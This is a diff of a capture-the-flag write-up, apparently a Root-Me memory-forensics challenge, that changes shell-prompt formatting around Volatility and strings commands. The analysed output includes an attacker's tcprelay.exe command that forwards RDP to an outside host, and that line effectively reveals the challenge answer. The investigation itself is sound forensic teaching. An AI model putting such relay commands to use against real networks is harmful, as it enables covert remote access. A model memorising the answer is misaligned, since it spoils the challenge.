@@ -14,8 +14,7 @@ The validation flag should have this format : IP:PORT
 To investigate the system's network activity, we began by using the `netscan` plugin, which enumerates active network connections. 
 Interestingly, the results showed only internal port communications - no external IP connections were identified, suggesting possible use of covert channels or redirection.
 ```bash
-┌──(kali㉿kali)-[~/Desktop]
-└─$ ./vol2/volatility2 -f ch2.dmp --profile=Win7SP0x86 netscan | grep "iexplore.exe"
+> ./vol2/volatility2 -f ch2.dmp --profile=Win7SP0x86 netscan | grep "iexplore.exe"
 Volatility Foundation Volatility Framework 2.6
 0x1dedb4f8         TCPv4    127.0.0.1:49178                127.0.0.1:12080      ESTABLISHED      2772     iexplore.exe   
 0x1fbca1a0         UDPv4    127.0.0.1:60151                *:*                                   3044     iexplore.exe   2013-01-12 16:57:47 UTC+0000
@@ -82,8 +81,7 @@ These findings suggest that an attacker may have used `cmd.exe` to execute `tcpr
 Since `conhost.exe` handles console input/output, it likely processed these commands. 
 To dig deeper, we performed a memory dump of the `conhost.exe` process using the `memdump` plugin, resulting in the file `2168.dmp`.
 ```bash
-┌──(kali㉿kali)-[~/Desktop]
-└─$ ./vol2/volatility2 -f ch2.dmp --profile=Win7SP0x86 memdump -p 2168 --dump-dir=./root-me 
+> ./vol2/volatility2 -f ch2.dmp --profile=Win7SP0x86 memdump -p 2168 --dump-dir=./root-me 
 Volatility Foundation Volatility Framework 2.6
 ************************************************************************
 Writing conhost.exe [  2168] to 2168.dmp
@@ -92,8 +90,7 @@ Writing conhost.exe [  2168] to 2168.dmp
 Finally, we analyzed the dump using `strings` and searched for occurrences of **tcprelay**. 
 This yielded critical information, including the target IP address and port used by the attacker.
 ```bash
-┌──(kali㉿kali)-[~/Desktop]
-└─$ strings ./root-me/2168.dmp | grep "tcprelay.exe"     
+> strings ./root-me/2168.dmp | grep "tcprelay.exe"     
 tcprelay.exe 192.168.0.22 3389 yourcsecret.co.tv 443 
 C:\Users\John Doe\AppData\Local\Temp\TEMP23\tcprelay.exeJ"
 C:\Users\John Doe\AppData\Local\Temp\TEMP23\tcprelay.exeN_
